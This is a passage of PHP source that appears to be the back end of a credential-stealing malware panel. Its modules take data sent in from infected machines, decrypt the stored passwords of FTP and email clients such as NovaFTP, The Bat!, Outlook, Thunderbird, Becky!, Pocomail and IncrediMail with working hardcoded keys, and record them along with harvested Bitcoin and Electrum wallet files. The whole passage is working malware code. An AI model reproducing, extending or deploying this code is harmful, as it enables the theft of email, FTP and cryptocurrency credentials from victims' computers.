				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// NovaFTP

class module_novaftp extends module
{
	private function decrypt($encrypted_password)
	{
		$encrypted_password = trim($encrypted_password);
		if (!strlen($encrypted_password))
			return '';

		$decoded_password = base64_decode($encrypted_password);
		if (!strlen($decoded_password))
		{
			$this->log->add('ERR_INVALID_BASE64_STRING');
			return '';
		}

		$xor_str = 's235280i113755-381ds22';

		$decrypted_password = '';

		for ($i = 0; $i < strlen($decoded_password); $i++)
		{
			$decrypted_password .= chr(ord($decoded_password[$i]) ^ ord($xor_str[$i % strlen($xor_str)]));
		}

		return $decrypted_password;
	}

	protected function process_sqlite_file($file_contents)
	{
		if (strlen($file_contents) == 0)
			return;

		global $global_temporary_directory;

		if (!class_exists('SQLite3') && !class_exists('PDO'))
		{
			$this->log->add("NOTIFY_PDO_AND_SQLITE3_CLASSES_DO_NOT_EXIST");
			return;
		}

		$tmp_name = tempnam($global_temporary_directory, 'sqlite');

		if (!is_writable($global_temporary_directory))
		{
			$this->log->add("ERR_CANNOT_ACCESS_SQLITE_DB_FILE");
			return;
		}

		$fp = fopen($tmp_name, "wb");
		if (!$fp)
		{
			$this->log->add("ERR_CANNOT_ACCESS_SQLITE_DB_FILE");
			return;
		}

		if (fwrite($fp, $file_contents) != strlen($file_contents))
		{
			fclose($fp);
			unlink($tmp_name);
			$this->log->add("ERR_CANNOT_WRITE_SQLITE_DB_FILE");
			return;
		}

		fclose($fp);

		if (class_exists('SQLite3'))
		{
			// use SQLite3 php-extension
			try
			{
				$database = new SQLite3($tmp_name, SQLITE3_OPEN_READONLY);
				if (!$database)
				{
					$this->log->add("ERR_CANNOT_OPEN_SQLITE_DB");
				} else
				{
					try
					{
						$results = @$database->query('SELECT * FROM "bmk_ftp"');
						if ($results)
						{
							while ($row = $results->fetchArray())
							{
								$host = assign($row['host_name']);

								$user = assign($row['user_name']);
								$pass = assign($row['user_pass']);
								$pass = $this->decrypt($pass);
								$port = assign($row['host_port']);
								$dir = assign($row['host_start_directory']);

								$host = Utf8ToWin($host);
								$user = Utf8ToWin($user);
								$pass = Utf8ToWin($pass);
								$dir = Utf8ToWin($dir);

								$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
							}
						}
					}
					catch(Exception $e)
					{
					}

					@$database->close();
					unset($database);
				}
			}
			catch (Exception $e)
			{
				if (isset($database))
				{
					@$database->close();
					unset($database);
				}
    			$this->log->add("ERR_SQLITE_EXCEPTION: $e");
			}
		} else if (class_exists('PDO'))
		{
			// use PDO driver
			$drivers = PDO::getAvailableDrivers();
			$driver_available = array_search('sqlite', $drivers) !== false;

			if ($driver_available)
			{
				try
				{
					/*** create the database file in /tmp ***/
					$dbh = new PDO("sqlite:$tmp_name");

					if (!$dbh)
						$this->log->add("ERR_CANNOT_OPEN_PDO_SQLITE_DB");
					else
					{
						/*** set all errors to exceptions ***/
						$dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

						try
						{
							$sql = 'SELECT * FROM "bmk_ftp"';
							foreach ($dbh->query($sql) as $row)
							{
								$host = assign($row['host_name']);

								$user = assign($row['user_name']);
								$pass = assign($row['user_pass']);
								$pass = $this->decrypt($pass);
								$port = assign($row['host_port']);
								$dir = assign($row['host_start_directory']);

								$host = Utf8ToWin($host);
								$user = Utf8ToWin($user);
								$pass = Utf8ToWin($pass);
								$dir = Utf8ToWin($dir);

								$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
							}
						}
						catch(Exception $e)
						{
						}

						unset($dbh);
					}
				}
				catch (Exception $e)
				{
					if (isset($dbh))
					{
						unset($dbh);
					}
					$this->log->add("ERR_PDO_EXCEPTION: $e");
				}
			}
		}
		unlink($tmp_name);
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$db_file = $stream->read_str();
				$this->process_sqlite_file($db_file);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Windows Mail Base Class

class module_windows_mail_base extends module
{
    private $password_pairs = array();

    private function read_record_data($xml_array, $name, $xml_tag)
    {
    	$data = assign($xml_array[$name.'_'.$xml_tag]);
    	if (is_array($data))
    		return Utf8ToWin(assign($data['value']));
		else
			return '';
    }

    private function read_record($xml_array, $name, $protocol)
    {
    	$host = $this->read_record_data($xml_array, $name, 'Server');
    	$user = $this->read_record_data($xml_array, $name, 'User_Name');
    	$pass = assign($this->password_pairs[$this->read_record_data($xml_array, $name, 'Password2')]);
    	$port = intval(hexdec($this->read_record_data($xml_array, $name, 'Port')));
    	$email = $this->read_record_data($xml_array, 'SMTP', 'Email_Address');
    	$sicily =  $this->read_record_data($xml_array, 'SMTP', 'Use_Sicily');

    	$this->add_email($email, $protocol, $host, $port, $user, $pass);

    	if ($protocol == 'smtp' && $sicily == '00000002')
    	{
			// Copy auth settings from POP3
    		$user = $this->read_record_data($xml_array, 'POP3', 'User_Name');
    		$pass = assign($this->password_pairs[$this->read_record_data($xml_array, 'POP3', 'Password2')]);
    		$this->add_email($email, $protocol, $host, $port, $user, $pass);

    		// Copy auth settings from IMAP
    		$user = $this->read_record_data($xml_array, 'IMAP', 'User_Name');
    		$pass = assign($this->password_pairs[$this->read_record_data($xml_array, 'IMAP', 'Password2')]);
    		$this->add_email($email, $protocol, $host, $port, $user, $pass);
    	}
    }

    private function read_xml_item($xml_array)
    {
    	$this->read_record($xml_array, 'POP3', 'pop3');
    	$this->read_record($xml_array, 'SMTP', 'smtp');
    	$this->read_record($xml_array, 'IMAP', 'imap');
    	$this->read_record($xml_array, 'HTTPMail', 'http');

        foreach ($xml_array as $value)
        {
            if (is_array($value))
                $this->read_xml_item($value);
        }
    }

    private function rec_scan_xml_array($xml_array)
    {
        foreach ($xml_array as $key=>$value)
        {
            if (is_array($value))
            {
                if (strpos(strval($key), 'MessageAccount') !== false)
                {
                    $this->read_xml_item($value);
                }
                $this->rec_scan_xml_array($value);
            }
        }
    }

    private function process_xml($value)
    {
        if (!strlen($value))
            return;

        $value = CutXMLEncoding($value);
        $xml_parser = new XMLParser($value);

        $parsed_xml = $xml_parser->parse();
        if (!$xml_parser->isError || is_array($parsed_xml))
        {
            $this->rec_scan_xml_array($parsed_xml);
        } else
        {
			// do not report xml errors here
            // $this->log->add("ERR_XML_PARSE"); 
        }
    }

    public function import_item($stream, $id)
    {
        switch ($id)
        {
            case 0x0001:
                $encrypted_pass = $stream->read_str();
                $decrypted_pass = ztrim(unicode_to_ansi($stream->read_str()));
                $this->password_pairs[$encrypted_pass] = $decrypted_pass;
                break;
            case 0x0002:
                $xml_file = $stream->read_str();
                $this->process_xml($xml_file);
                break;
            default:
                $this->log->add("ERR_UNKNOWN_ITEM_TYPE");
                return false;
        }
        return true;
    }
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Windows Mail

class module_windows_mail extends module_windows_mail_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Windows Live Mail

class module_windows_live_mail extends module_windows_mail_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Becky!

class module_becky extends module
{
	private function decrypt($encrypted_password)
	{
		$decrypted_password = '';
		for ($i = 0; $i < strlen($encrypted_password); $i++)
		{
			$decrypted_password .= chr(ord($encrypted_password[$i]) ^ 2);
		}
		return base64_decode(base64_decode($decrypted_password));
	}

	protected function process_ini_file($file_contents)
	{
		if (strlen($file_contents) <= 4)
			return;

		$parsed_ini = parse_ini($file_contents);
		foreach ($parsed_ini as $section)
		{
			if (!is_array($section))
				continue;

			$mail_server = assign($section['mailserver']);
			$smtp_server = assign($section['smtpserver']);
			$smtp_port = assign($section['smtpport']);
			$user = assign($section['userid']);
			$pass = $this->decrypt(assign($section['passwd']));
			$email = assign($section['mailaddress']);
			$protocol = assign($section['protocol']);

			if ($protocol == '1')
			{
				$mail_port = assign($section['imap4port']);
				$protocol = 'imap';
			} else
			{
				$mail_port = assign($section['pop3port']);
				$protocol = 'pop3';
			}
			// imap/pop3
			$this->add_email($email, $protocol, $mail_server, $mail_port, $user, $pass);
			// smtp
			$this->add_email($email, 'smtp', $smtp_server, $smtp_port, $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$ini_contents = $stream->read_str();
				$this->process_ini_file($ini_contents);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}


// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Pocomail

class module_pocomail extends module
{
	private function decrypt($encrypted_password)
	{
		$encrypted_password = trim($encrypted_password);
		if (!strlen($encrypted_password))
			return '';

		$decoded_password = hextostr($encrypted_password);
		$decrypted_password = '';

        $seed = 0x2A9A;
		for ($i = 0; $i < strlen($decoded_password); $i++)
		{
            $decrypted_password .= chr(ord($decoded_password[$i]) ^ (($seed >> 8) & 0xff));
            $seed += ord($decoded_password[$i]);
            $seed = hexdec(gmp_strval(gmp_and(gmp_add(gmp_mul("$seed", "0x8141"), "0x3171"), "0xffff"), 16));
		}
		return $decrypted_password;
	}

	protected function process_ini_file($file_contents)
	{
		if (strlen($file_contents) <= 4)
			return;

		$parsed_ini = parse_ini($file_contents);
		foreach ($parsed_ini as $section)
		{
			if (!is_array($section))
				continue;

			$email = assign($section['email']);
			$pop3_server = assign($section['popserver']);
			$pop3_pass = $this->decrypt(assign($section['poppass']));
			$pop3_user = assign($section['popuser']);

			$smtp_server = assign($section['smtp']);
			$smtp_user = assign($section['smtpuser']);
			$smtp_pass = $this->decrypt(assign($section['smtppass']));

			if (assign($section['imap']) == '1')
				$protocol = 'imap';
			else
				$protocol = 'pop3';

			// pop3/imap
			$this->add_email($email, $protocol, $pop3_server, '', $pop3_user, $pop3_pass);
			// smtp
			$this->add_email($email, 'smtp', $smtp_server, '', $smtp_user, $smtp_pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$ini_contents = $stream->read_str();
				$this->process_ini_file($ini_contents);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// IncrediMail

class module_incredimail extends module
{
	private function decrypt($encrypted_password)
	{
		$xor_str = chr(0xb9).chr(0x02).chr(0xfa).chr(0x01);

		$decrypted_password = '';

		for ($i = 0; $i < strlen($encrypted_password); $i++)
		{
			$decrypted_password .= chr(ord($encrypted_password[$i]) ^ ord($xor_str[$i % strlen($xor_str)]));
		}

		return $decrypted_password;
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$email = $stream->read_str();
				$protocol = $stream->read_str();

				$pop3_server = $stream->read_str();
				$pop3_port = $stream->read_str();
				if (strlen($pop3_port) == 4)
				{
					$pop3_port = data_int32($pop3_port);
				} else
				{
					$pop3_port = 0;
				}
				$pop3_user = $stream->read_str();
				$pop3_pass = $this->decrypt($stream->read_str());

				$smtp_server = $stream->read_str();
				$smtp_port = $stream->read_str();
				if (strlen($smtp_port) == 4)
				{
					$smtp_port = data_int32($smtp_port);
				} else
				{
					$smtp_port = 0;
				}
				$smtp_user = $stream->read_str();
				$smtp_pass = $this->decrypt($stream->read_str());

				if ($protocol == 'IMAP')
					$protocol = 'imap';
				else
					$protocol = 'pop3';

				// pop3/imap
				$this->add_email($email, $protocol, $pop3_server, $pop3_port, $pop3_user, $pop3_pass);
				// smtp
				$this->add_email($email, 'smtp', $smtp_server, $smtp_port, $smtp_user, $smtp_pass);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// The Bat!

class stream_thebat extends stream
{
	public function read_tb_data($index_num, $data_offset, $length)
	{
		if (!$this->state)
			return false;

		$index_len = $index_num*13 + 8;
		$original_pos = $this->pos;
		$this->seek($index_len+$data_offset+4);
		$data = $this->read_strlen($length);
		$this->seek($original_pos);

		if (!$this->state)
			return false;

		return $data;
	}
}

class module_thebat extends module
{
	private function decrypt($encrypted_password)
	{
		$encrypted_password = trim($encrypted_password);
		if (!strlen($encrypted_password))
			return '';

		$tb_b64   = '+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
		$real_b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

		// The Bat! uses modified base64 table, translate to normal one
		for ($i = 0; $i < strlen($encrypted_password); $i++)
		{
			$tb_pos = strpos($tb_b64, $encrypted_password[$i]);
			if ($tb_pos === false)
			{
				$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
				return '';
			}
			$encrypted_password[$i] = $real_b64[$tb_pos];
		}

		$decoded_password = base64_decode($encrypted_password, true);
		if (!strlen($decoded_password))
		{
			$this->log->add('ERR_INVALID_BASE64_STRING');
			return '';
		}

		if (strlen($decoded_password) < 4)
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
			return '';
		}

		// decode password length
		for ($i = 0; $i < 4; $i++)
		{
			$decoded_password[$i] = chr(0xff-ord($decoded_password[$i]));
		}

		$pass_len = data_int32(substr($decoded_password, 0, 4));
		$decoded_password = substr($decoded_password, 4);
		$decrypted_password = '';

		for ($i = 0; $i < strlen($decoded_password); $i++)
		{
			$decrypted_password .= chr(ord($decoded_password[$i]) ^ 0x5a);
		}

		$decrypted_password = substr($decrypted_password, 0, $pass_len);

		return strrev($decrypted_password);
	}

	protected function process_cfn($cfn_file)
	{
		if (strlen($cfn_file) < 4)
			return;

		$stream = new stream_thebat($cfn_file, $this->log);
		$index_num = $stream->read_dword();
		if (!$index_num)
			return;

		if (!$stream->state)
			return;

		$email = '';
		$server = '';
		$user = '';
		$pass = '';
		$smtp_server = '';
		$smtp_port = '';
		$pop3_port = '';
		$imap_port = '';
		$smtp_user = '';
		$smtp_pass = '';
		$protocol = 0;

		for ($i = 0; $i < $index_num; $i++)
		{
			$flag = $stream->read_byte();
			$seq = $stream->read_dword();
			$offs = $stream->read_dword();
			$len = $stream->read_dword();

			if ($flag == 0)
			{
				switch ($seq)
				{
					case 0x00008159:
						$email = $stream->read_tb_data($index_num, $offs, $len);
						break;
					case 0x00008179:
						$server = $stream->read_tb_data($index_num, $offs, $len);
						break;
		          	case 0x000081A7: 
		          		$user = $this->decrypt($stream->read_tb_data($index_num, $offs, $len));
		          		break;
		          	case 0x000081A6: 
		          		$pass = $this->decrypt($stream->read_tb_data($index_num, $offs, $len));
		          		break;
					case 0x0000819e:
						$smtp_server = $stream->read_tb_data($index_num, $offs, $len);
						break;
					case 0x00008194:
						$smtp_pass = $stream->read_tb_data($index_num, $offs, $len);
						break;
					case 0x00008195:
						$smtp_user = $stream->read_tb_data($index_num, $offs, $len);
						break;
					case 0x000081bd:
						$smtp_pass = $this->decrypt($stream->read_tb_data($index_num, $offs, $len));
                        break;
				}
			} elseif ($flag == 1)
			{
				switch ($seq)
				{
					case 0x00008131;
						$protocol = $offs;
						break;
					case 0x00008180:
						$smtp_port = $offs;
						break;
					case 0x0000817e:
						$pop3_port = $offs;
						break;
					case 0x0000817c:
						$imap_port = $offs;
						break;
				}
			}

			if (!$stream->state || $stream->eof())
				break;
		}

		if ($protocol == 0)
		{
			// pop3
			$this->add_email($email, 'pop3', $server, $pop3_port, $user, $pass);
		}
		elseif ($protocol == 1)
		{
			// imap
			$this->add_email($email, 'imap', $server, $imap_port, $user, $pass);
		}

		// smtp
		if (!strlen($smtp_user) && !strlen($smtp_pass) && strlen($user) && strlen($pass))
		{
			$smtp_user = $user;
			$smtp_pass = $pass;
		}
		$this->add_email($email, 'smtp', $smtp_server, $smtp_port, $smtp_user, $smtp_pass);
	}

	protected function process_cfg($cfg_file)
	{
		if (strlen($cfg_file) < 4)
			return;

		$stream = new stream_thebat($cfg_file, $this->log);

		$email = '';
		$server = '';
		$user = '';
		$pass = '';
		$smtp_port = '';
		$pop3_port = '';
		//$imap_port = '';
		$smtp_server = '';
		$smtp_user = '';
		$smtp_pass = '';

		while ($stream->state && !$stream->eof())
		{
			$seq = $stream->read_dword();
			$len = $stream->read_dword();
			if ($len < 0)
            {
                $this->log->add("ERR_INVALID_TB_CFG_FILE");
				break;
            }
			$next_offset = $stream->pos + $len;

			switch ($seq)
			{
				case 0x02: 
					$email = $stream->read_str();
					break;
				case 0x0a: 
					$smtp_server = $stream->read_str();
					break;
				case 0x0b: 
					$server = $stream->read_str();
					break;
				case 0x0c:
					$smtp_port = $stream->read_dword();
					break;
				case 0x0d:
					$pop3_port = $stream->read_dword();
					break;
				case 0x0e:
					//$imap_port = $stream->read_dword();
					break;
				case 0x0f: 
					$user = $this->decrypt($stream->read_str());				
					break;
				case 0x10: 
					$pass = $this->decrypt($stream->read_str());				
					break;
				case 0x2b: 
					$smtp_user = $stream->read_str();	
					break;
				case 0x2f: 
					$smtp_pass = $this->decrypt($stream->read_str());				
					break;
			}

			$stream->seek($next_offset);
		}

		// pop3/imap
		$this->add_email($email, 'pop3', $server, $pop3_port, $user, $pass);

		// smtp
		if (!strlen($smtp_user) && !strlen($smtp_pass) && strlen($user) && strlen($pass))
		{
			$smtp_user = $user;
			$smtp_pass = $pass;
		}
		$this->add_email($email, 'smtp', $smtp_server, $smtp_port, $smtp_user, $smtp_pass);
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				// old config
				$cfg_file = $stream->read_str();
				$this->process_cfg($cfg_file);
				break;
			case 0x0001:
				// new config
				$cfn_file = $stream->read_str();
				$this->process_cfn($cfn_file);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Outlook

class module_outlook extends module
{
	private $values = array();
	private $pstorage = array();

	private function process_values()
	{
		// email address
		$email = assign($this->values['SMTP Email Address']);
		if (!strlen($email))
			$email = assign($this->values['Email']);
		if (!strlen($email))
			$email = assign($this->values['NNTP Email Address']);

		// smtp
		$smtp_server = assign($this->values['SMTP Server']);
		$smtp_user = assign($this->values['SMTP User Name']);
		if (!strlen($smtp_user))
			$smtp_user = assign($this->values['SMTP User']);
		$smtp_pass = assign($this->values['SMTP Password']);
		if (!strlen($smtp_pass))
			assign($this->values['SMTP Password2']);

		// pop3
		$pop_server = assign($this->values['POP3 Server']);
		$pop_user = assign($this->values['POP3 User Name']);
		if (!strlen($pop_user))
			$pop_user = assign($this->values['POP3 User']);
		$pop_pass = assign($this->values['POP3 Password']);
		if (!strlen($pop_pass))
			$pop_pass = assign($this->values['POP3 Password2']);

		// imap
		$imap_server = assign($this->values['IMAP Server']);
		$imap_user = assign($this->values['IMAP User Name']);
		if (!strlen($imap_user))
			$imap_user = assign($this->values['IMAP User']);
		$imap_pass = assign($this->values['IMAP Password']);
		if (!strlen($imap_pass))
			$imap_pass = assign($this->values['IMAP Password2']);

		// ports
		$smtp_port = assign($this->values['SMTP Port']);
		$pop_port = assign($this->values['POP3 Port']);
		$imap_port = assign($this->values['IMAP Port']);

		// sync pop3 -> smtp
		if (!strlen($smtp_user) && !strlen($smtp_pass) && strlen($pop_user) && strlen($pop_pass))
		{
			$this->add_email($email, 'smtp', $smtp_server, $smtp_port, $pop_user, $pop_pass);
		}
		// sync imap -> smtp
		if (!strlen($smtp_user) && !strlen($smtp_pass) && strlen($imap_user) && strlen($imap_pass))
		{
			$this->add_email($email, 'smtp', $smtp_server, $smtp_port, $imap_user, $imap_pass);
		}
		$this->add_email($email, 'smtp', $smtp_server, $smtp_port, $smtp_user, $smtp_pass);
		$this->add_email($email, 'pop3', $pop_server, $pop_port, $pop_user, $pop_pass);
		$this->add_email($email, 'imap', $imap_server, $imap_port, $imap_user, $imap_pass);
	}


	private function decrypt_old($value)
	{
		if (strlen($value) <= 2)
			return '';

		if (ord($value[0]) == 1 && ord($value[1]) == 1)
		{
			// registry
			$value = substr($value, 2);
			if (strlen($value) <= 4)
				return '';

			$l = data_int32(substr($value, 0, 4));
			$value = substr($value, 4);

			if (strlen($value) != $l)
				return '';

			$value = chr(0x75).chr(0x18).chr(0x15).chr(0x14).$value;
			$decrypted_pass = '';

			for ($i = 1; $i <= int_divide($l, 4); $i++)
			{
				$int_value = data_int32(substr($value, $i*4, 4)) ^ data_int32(substr($value, ($i-1)*4, 4));
				$value[$i*4+0] = chr(($int_value) & 0xff);
				$value[$i*4+1] = chr(($int_value >> 8) & 0xff);
				$value[$i*4+2] = chr(($int_value >> 16) & 0xff);
				$value[$i*4+3] = chr(($int_value >> 24) & 0xff);
			}

			for ($i = int_divide($l, 4)*4+1; $i <= int_divide($l, 4)*4 + ($l%4); $i++)
			{
				$value[$i+3] = chr(ord($value[$i+3]) ^ ord($value[$i+3-($l%4)]));
			}

			return ztrim(substr($value, 4));
		} else if (ord($value[0]) == 1 && ord($value[1]) == 2)
		{
			// pstorage
			$value = ztrim(unicode_to_ansi(substr($value, 2)));
			return assign($this->pstorage[$value]);
		}

		return '';
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				// plain values
				$item_name = $stream->read_str();
				$item_value = $stream->read_str();

				$this->values[$item_name] = $item_value;
				break;
			case 0x0001:
				// passwords2 pstorage
				$item_name = $stream->read_str();
				$item_value = $stream->read_str();
				$this->values[$item_name] = ztrim(assign($this->pstorage[$item_value]));
				break;
			case 0x0002:
				// passwords2 registry (CryptUnprotectData)
				$item_name = $stream->read_str();
				$item_value = $stream->read_str();
				$this->values[$item_name] = $item_value;
				break;
			case 0x0003:
				// passwords
				$item_name = $stream->read_str();
				$item_value = $this->decrypt_old($stream->read_str());

				$this->values[$item_name] = $item_value;
				break;
			case 0x0004:
				// binary/dword values (port numbers, etc)
				$item_name = $stream->read_str();
				$item_value = $stream->read_str();
				if (strlen($item_value) == 4)
				{
					$item_value = data_int32($item_value);
					$this->values[$item_name] = strval($item_value);
				}
				break;
			case 0x0005:
			case 0x0006:
				// pstorage values
				$item_name = $stream->read_str();
				$stream->read_str(); // guid
				$value = $stream->read_str();
				$this->pstorage[$item_name] = $value;
				break;
			case 0x0007:
				// pstorage values stored as subtype guid
				$stream->read_str(); // name
				$guid = $stream->read_str();
				$value = $stream->read_str();
				$value = substr($value, 4);
				$this->pstorage[$guid] = $value;
				break;
			case 0x0010:
				// process password data
				$this->process_values();

				// clear values array
				$this->values = array();
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Thunderbird

class module_thunderbird extends module
{
	private $mailboxes = array();

	protected function process_conf($value)
	{
		if (!strlen($value))
			return;

		$line_start = 'user_pref(';
		$line_end = ');';

		$values = parse_lines($value);

		$conf_values = array();

		foreach ($values as $line)
		{
			$line = Utf8ToWin(trim($line));
			if (str_begins($line, $line_start) && str_ends($line, $line_end))
			{
				$line = stripslashes(substr($line, strlen($line_start), -strlen($line_end)));
				if (strlen($line) < 2)
					continue;
				$name_end = strpos($line, '",');
				if ($name_end !== false && $line[0] == '"')
				{
					$name = substr($line, 1, $name_end-1);

					$value = trim(substr($line, $name_end+2));

					if (str_begins($value, '"') && str_ends($value, '"'))
						$value = trim(substr($value, 1, -1));

					$name = strtolower($name);
					$conf_values[$name] = $value;
				}
			}
		}

		$accounts = assign($conf_values['mail.accountmanager.accounts']);
		$accounts = explode(',', $accounts);
		if (is_array($accounts) && count($accounts))
		{
			foreach ($accounts as $account)
			{
				$server = assign($conf_values['mail.account.'.$account.'.server']);

				$host = assign($conf_values['mail.server.'.$server.'.hostname']);
				$port = assign($conf_values['mail.server.'.$server.'.port']);
				$user = assign($conf_values['mail.server.'.$server.'.username']);
				$protocol = assign($conf_values['mail.server.'.$server.'.type']);

				$pass = '';

				if ($protocol == 'imap')
				{
					if (isset($this->mailboxes['imap://'.$host]))
						$pass = $this->mailboxes['imap://'.$host][1];
				} elseif ($protocol == 'pop3')
				{
					if (isset($this->mailboxes['pop3://'.$host]))
						$pass = $this->mailboxes['pop3://'.$host][1];
				}

				if (!strlen($pass))
				{
					if (isset($this->mailboxes['mailbox://'.$host]))
						$pass = $this->mailboxes['mailbox://'.$host][1];
					else
						$pass = '';
				}

				$identities = assign($conf_values['mail.account.'.$account.'.identities']);
				$identities = explode(',', $identities);
				if (is_array($identities) && count($identities))
				{
					foreach ($identities as $identity)
					{
						$email = assign($conf_values['mail.identity.'.$identity.'.useremail']);
						$smtp_name = assign($conf_values['mail.identity.'.$identity.'.smtpserver']);

						// find default server
						if (!strlen($smtp_name))
						{
							$smtp_name = assign($conf_values['mail.smtp.defaultserver']);
						}
                        if (!strlen($smtp_name))
                        {
                        	$smtp_names = assign($conf_values['mail.smtpservers']);
							$smtp_names = explode(',', $smtp_names);
							if (is_array($smtp_names) && count($smtp_names))
								$smtp_name = $smtp_names[0];
                        }

						$smtp_host = assign($conf_values['mail.smtpserver.'.$smtp_name.'.hostname']);
						$smtp_user = assign($conf_values['mail.smtpserver.'.$smtp_name.'.username']);
						$smtp_port = assign($conf_values['mail.smtpserver.'.$smtp_name.'.port']);

						if (isset($this->mailboxes['smtp://'.$smtp_host]))
							$smtp_pass = $this->mailboxes['smtp://'.$smtp_host][1];
						else
							$smtp_pass = '';

						if (is_array($smtp_pass))
							$smtp_pass = $smtp_pass[1];

						// pop3/imap
						if ($protocol == 'pop3' || $protocol == 'imap')
							$this->add_email($email, $protocol, $host, $port, $user, $pass);

						$this->add_email($email, 'smtp', $smtp_host, $smtp_port, $smtp_user, $smtp_pass);
					}
				}
			}
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				// mailbox passwords
				$mailbox = trim(Utf8ToWin($stream->read_str()));
				$user = trim(Utf8ToWin($stream->read_str()));
				$pass = trim(Utf8ToWin($stream->read_str()));
				if (strlen($user) && strlen($pass) && strlen($mailbox))
					$this->mailboxes[$mailbox] = array($user, $pass);
				break;
			case 0x0001:
				// server settings file
				$js_conf_file = $stream->read_str();
				$this->process_conf($js_conf_file);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FastTrackFTP

class module_fasttrack extends module_ftpcommander_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Bitcoin

class module_bitcoin_base extends module
{
	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$wallet_data = $stream->read_str();

				$this->add_wallet($wallet_data);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

class module_bitcoin extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Electrum

class module_electrum extends module_bitcoin_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// MultiBit

